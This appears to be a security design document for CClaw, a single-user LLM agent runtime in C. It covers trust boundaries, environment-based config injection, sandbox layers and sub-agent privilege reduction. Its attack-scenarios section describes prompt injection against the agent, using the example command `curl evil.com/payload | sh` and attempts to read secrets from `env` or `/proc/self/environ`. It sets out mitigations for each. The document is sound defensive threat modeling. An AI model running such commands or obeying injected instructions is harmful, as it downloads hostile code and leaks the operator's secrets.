# Security Model

## Trust Boundaries

```
┌─────────────────────────────────────────────────────────┐
│  TRUSTED                                                │
│  Daemon process — unsandboxed, holds all secrets,       │
│  sole writer to cclaw.db, forks agents                 │
├─────────────────────────────────────────────────────────┤
│  TRUSTED (config-constrained)                           │
│  Agent process — your compiled C binary, runs LLM loop  │
│  Trusts: own code, env-injected config, own DB          │
│  Constrained by: setrlimit, http_policy, config values  │
├─────────────────────────────────────────────────────────┤
│  UNTRUSTED                                              │
│  Shell children / mjs — execute LLM-directed commands   │
│  Sandboxed by: namespaces, proxy, env stripping         │
│  Cannot: reach arbitrary hosts, read secrets, escape fs │
└─────────────────────────────────────────────────────────┘
```

| Component | Trust level | Why |
|-----------|-------------|-----|
| Daemon | Full | Your binary, root of trust, holds encryption key |
| Agent process | High (self-constrained) | Your binary, but executes LLM-directed logic; respects injected config |
| LLM output | Untrusted input | Adversarial by assumption (prompt injection, jailbreaks) |
| Shell children | Untrusted | Execute arbitrary commands from LLM; kernel-sandboxed |
| JS runtime | Untrusted | Executes LLM-generated code; heap-capped, instruction-limited |
| External HTTP responses | Untrusted | Wrapped in boundary markers, homoglyph-sanitized |

## Agent Process: Trusted Binary, Config-Constrained

The agent process is **your compiled code** — not a container running arbitrary payloads. The security model relies on the agent binary correctly implementing:

1. **Config loading** — reads `CCLAW_*` env vars at startup, builds internal policy structs
2. **Policy enforcement** — `http_check_policy()` called before every outbound connection
3. **Tool dispatch** — workspace path validation, shell timeout, iteration limits
4. **Secret handling** — holds decrypted API key in memory, never logs it, never passes to shell children

### What Could Go Wrong

| Failure mode | Impact | Mitigation |
|--------------|--------|-----------|
| Bug in policy enforcement | Agent reaches blocked host | Code review; integration tests (T116) |
| Agent ignores config limit | Infinite loop, resource exhaustion | `setrlimit` is kernel-enforced (can't be bypassed from userspace) |
| Memory corruption | Arbitrary behavior | `-Wall -Wextra -Werror`, ASAN in dev, arena allocator limits scope |
| Agent leaks secret to LLM context | Key visible in session history | Never include provider-native env var (e.g. `OPENROUTER_API_KEY`) in any message/tool_result; grep for leaks in tests |
| Agent writes to wrong DB | Cross-agent data corruption | Agent only opens `CCLAW_AGENT_DB` path; namespace sandbox hides other paths |

### Why This Is Acceptable

- Single user — no multi-tenant isolation requirement
- Binary is compiled from audited source — not downloaded/executed dynamically
- Ephemeral process (one turn) — no long-lived state accumulation
- `setrlimit` provides hard kernel caps regardless of bugs
- Namespace sandbox for shell children provides filesystem isolation even if code has path-traversal bugs

## Config Injection via Environment Variables

Daemon injects config at fork time. Agent reads once at startup, builds internal structs, then operates.

### Principles

1. **Env vars are the sole config source** — agent never reads config files, never opens cclaw.db for config
2. **Parse once, validate early** — `agent_config_from_env()` runs at startup, validates all values, fails fast on malformed input
3. **Immutable after load** — config struct is read-only for process lifetime; no runtime config reload
4. **Fail closed** — missing required var (e.g. `CCLAW_AGENT_DB`) → `_exit(AGENT_EXIT_ERROR)` immediately
5. **Minimal surface** — only inject what the agent needs; don't pass daemon internals

### Env Var Security Properties

| Var | Sensitivity | Notes |
|-----|-------------|-------|
| `CCLAW_AGENT_NAME` | Low | Identity string |
| `CCLAW_AGENT_DB` | Low | Path |
| `CCLAW_WORKSPACE` | Low | Path |
| `CCLAW_MODEL` | Low | Model name string |
| `CCLAW_MAX_ITERATIONS` | Low | Integer cap |
| `CCLAW_ALLOWED_HOSTS` | Medium | Defines network perimeter — must not be tampered with |
| `CCLAW_TOOLS` | Medium | Tool whitelist — controls agent capabilities |
| `CCLAW_SHELL_TIMEOUT` | Low | Integer |
| provider-native env var (e.g. `OPENROUTER_API_KEY`) | **High** | Decrypted secret — cleared from env after read |
| `CCLAW_DAEMON_DB` | Low | Path (only if read access granted) |
| `CCLAW_TOKEN_RATE_LIMIT` | Low | Integer |

### Best Practices for Config-Injected Processes

1. **Clear secrets from env immediately after reading**
   ```c
   const char *key = getenv(cfg->provider.api_key_env);
   char *api_key = strdup(key);  // copy to heap
   unsetenv(cfg->provider.api_key_env);  // remove from environ
   ```
   Why: `shell_exec` children inherit env. V47 strips CCLAW_* before exec, but defense-in-depth says don't keep secrets in env longer than necessary.

2. **Validate allowed_hosts before use**
   ```c
   // Reject private IPs in allowed_hosts (daemon should have caught this, but verify)
   for (int i = 0; i < policy.allowed_count; i++)
       if (is_private_ip(policy.allowed[i])) abort();
   ```

3. **Treat CCLAW_TOOLS as a whitelist, not a suggestion**
   - If tool not in list → don't register it
   - Empty list = no tools (not "all tools")
   - Unknown tool name → skip silently (forward compat)

4. **Don't expose config values to LLM**
   - System prompt should not contain `allowed_hosts` list (tells attacker what's reachable)
   - Don't include workspace path in error messages sent to LLM
   - Tool errors: generic "permission denied", not internal details

5. **Log config at startup (debug level), never log secrets**
   ```c
   fprintf(stderr, "[agent] name=%s model=%s tools=%s hosts=%s\n",
           name, model, tools_csv, hosts_csv);
   // Never: fprintf(stderr, "api_key=%s\n", api_key);
   ```

6. **Daemon validates before injection**
   - `allowed_hosts` entries must be valid hostnames (no paths, no wildcards except `*.domain`)
   - `max_iterations` must be positive integer ≤ 200
   - `workspace` must be under `.cclaw/agents/` (prevent path traversal)
   - `tools` must be subset of known tool names

## Defense-in-Depth Layers

Ordered from most to least critical:

| # | Layer | Scope | Kernel-enforced? | Bypassable by agent? |
|---|-------|-------|------------------|---------------------|
| 1 | `setrlimit` | Agent + children | Yes | No |
| 2 | Namespace sandbox | Shell/mjs children | Yes | No (separate process) |
| 3 | Credential proxy | Shell children network | Yes (iptables) | No (separate netns) |

## Sub-Agent Privilege Reduction (V123)

When an agent spawns a sub-agent, privileges can only decrease:

```
Parent: tools=[file_read,file_write,shell_exec,web_fetch], hosts=[api.github.com,pypi.org]
                        │
                        ▼ spawn_agent(task="check release")
Child:  tools=[file_read,web_fetch], hosts=[api.github.com]
```

**Mechanism**: daemon reads parent's effective config (agent_config + env inheritance); child's own agent_config is intersected with parent's at fork time. Injection:
- `CCLAW_TOOLS` = intersection(child.tools, parent.tools)
- `CCLAW_ALLOWED_HOSTS` = intersection(child.allowed_hosts, parent.allowed_hosts)
- `CCLAW_MAX_ITERATIONS` = min(child.max_iterations, parent.max_iterations)

**Why intersection, not union**: prevents privilege escalation via sub-agent. A restricted agent cannot grant itself more permissions by spawning a child with a broader config.

**Unnamed spawn** (no name arg): child session in parent's agent.db, same agent, same config. Process isolation only (own fork, setrlimit). No privilege boundary — it's the same agent doing parallel work.

**Named spawn** (launch existing agent): runs in target agent's own DB with target's own config, but daemon enforces parent ceiling. Target agent's config is a *request*, parent's config is the *ceiling*. Agent must already exist (⊥ created at spawn time).
| 4 | `http_check_policy()` | Agent outbound HTTP | No (app-level) | Only via code bug |
| 5 | Env stripping (V47) | Shell children | No (app-level) | Only via code bug |
| 6 | `prctl(PR_SET_PDEATHSIG)` | Orphan cleanup | Yes | No |

Layers 1–3 are hard boundaries (kernel-enforced, separate address space).
Layers 4–5 are soft boundaries (correct code required).
Layer 6 is bonus hardening (unavailable on some targets).

## Attack Scenarios

### Prompt injection → shell escape

LLM is tricked into calling `shell_exec("curl evil.com/payload | sh")`.

Mitigations:
- Shell child in network namespace → all TCP redirected to proxy
- Proxy checks `evil.com` against `allowed_hosts` → denied
- Even if proxy bypassed: filesystem is read-only (namespace remount)
- Even if file written: workspace only, no execute permission on workspace mount

### Prompt injection → secret exfiltration

LLM tries to read API key via `shell_exec("env")` or `file_read("/proc/self/environ")`.

Mitigations:
- V47: all CCLAW_* and API key vars unset before shell exec
- `file_read` restricted to workspace (V1)
- `/proc/self/environ` blocked by namespace (/ is read-only, /proc remounted minimal)
- Agent clears provider-native env var (e.g. `OPENROUTER_API_KEY`) from own env after startup read

### Agent code bug → writes wrong DB

Agent has path traversal in `db_open()` and opens another agent's DB.

Mitigations:
- Agent only receives own DB path via `CCLAW_AGENT_DB`
- No mechanism to discover other agent paths (no cclaw.db access by default)

### Malicious config in cclaw.db

Attacker compromises cclaw.db, sets `allowed_hosts: ["evil.com"]`.

Mitigations:
- cclaw.db is mode 0600, owned by daemon user
- Agent config changes require admin approval (V54)
- Daemon validates config sanity before fork (V64)
- This is a "game over" scenario — if cclaw.db is compromised, attacker has full control regardless

## Single-User Assumptions

CClaw is designed for one user. This simplifies the security model:

- No need for inter-user isolation (all agents serve one person)
- Admin approval = the operator approving via Telegram (not a separate security principal)
- "Trusted binary" assumption holds because the operator compiles it himself
- Secrets encrypted at rest protect against disk theft, not against the running system
- Rate limiting (V71) protects against runaway costs, not against malicious users

If CClaw ever becomes multi-user, the trust model changes fundamentally:
- Agent processes would need hard isolation (containers, VMs)
- Config injection would need cryptographic attestation
- Daemon.db would need per-user access control
- This is explicitly out of scope.
